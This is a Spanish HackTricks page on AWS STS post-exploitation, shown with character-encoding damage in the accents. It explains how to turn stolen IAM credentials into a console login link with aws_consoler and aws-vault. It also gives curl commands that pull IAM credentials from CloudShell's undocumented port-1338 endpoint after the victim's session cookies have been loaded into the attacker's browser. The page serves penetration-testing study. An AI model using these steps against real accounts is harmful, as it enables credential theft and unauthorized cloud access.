# AWS - Post Explotaci√≥n de STS

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## STS

Para m√°s informaci√≥n:

{% content-ref url="../../aws-security/aws-services/aws-iam-enum.md" %}
[aws-iam-enum.md](../../aws-security/aws-services/aws-iam-enum.md)
{% endcontent-ref %}

### De Credenciales IAM a Consola

#### aws\_consoler

Si has logrado obtener algunas credenciales IAM, es posible que est√©s interesado en acceder a la consola web. Puedes **generar un enlace de consola web** con [https://github.com/NetSPI/aws\_consoler](https://github.com/NetSPI/aws\_consoler).

```bash
cd /tmp
python3 -m venv env
source ./env/bin/activate
pip install aws-consoler
aws_consoler [params...] #Esto generar√° un enlace para iniciar sesi√≥n en la consola
```

{% hint style="warning" %}
Aseg√∫rate de que el usuario IAM tenga permiso `sts:GetFederationToken`, o proporciona un rol para asumir.
{% endhint %}

#### aws-vault

[**aws-vault**](https://github.com/99designs/aws-vault) es una herramienta para almacenar y acceder de forma segura a las credenciales de AWS en un entorno de desarrollo.

```bash
aws-vault list
aws-vault exec jonsmith -- aws s3 ls # Ejecuta aws cli con las credenciales de jonsmith
aws-vault login jonsmith # Abre un navegador iniciado sesi√≥n como jonsmith
```

{% hint style="info" %}
Tambi√©n puedes usar **aws-vault** para obtener una **sesi√≥n de consola en el navegador**
{% endhint %}

#### De Consola a Credenciales IAM

Si logras comprometer alg√∫n acceso a una consola web (tal vez robaste cookies y no pudiste acceder a la carpeta .aws), puedes obtener algunas credenciales de token IAM para ese usuario a trav√©s de **CloudShell**.

CloudShell expone las credenciales IAM a trav√©s de un **punto final no documentado en el puerto 1338**. Despu√©s de cargar las cookies de sesi√≥n de la v√≠ctima en tu navegador, puedes navegar a CloudShell y emitir los siguientes comandos para obtener las credenciales IAM.

```bash
TOKEN=$(curl -X PUT localhost:1338/latest/api/token -H "X-aws-ec2-metadata-token-ttl-seconds: 60")
curl localhost:1338/latest/meta-data/container/security-credentials -H "X-aws-ec2-metadata-token: $TOKEN"
```

<details>

<summary><strong>¬°Apoya a HackTricks y obt√©n beneficios!</strong></summary>

* Si quieres ver a tu **empresa anunciada en HackTricks** o si quieres acceder a la **√∫ltima versi√≥n de PEASS o descargar HackTricks en PDF** ¬°Consulta los [**PLANES DE SUSCRIPCI√ìN**](https://github.com/sponsors/carlospolop)!
* Obt√©n el [**swag oficial de PEASS y HackTricks**](https://peass.creator-spring.com)
* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colecci√≥n de exclusivos [**NFTs**](https://opensea.io/collection/the-peass-family)
* **√önete al** üí¨ [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **s√≠gueme** en **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm).
* **Comparte tus trucos de hacking enviando PR a los repositorios de GitHub de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>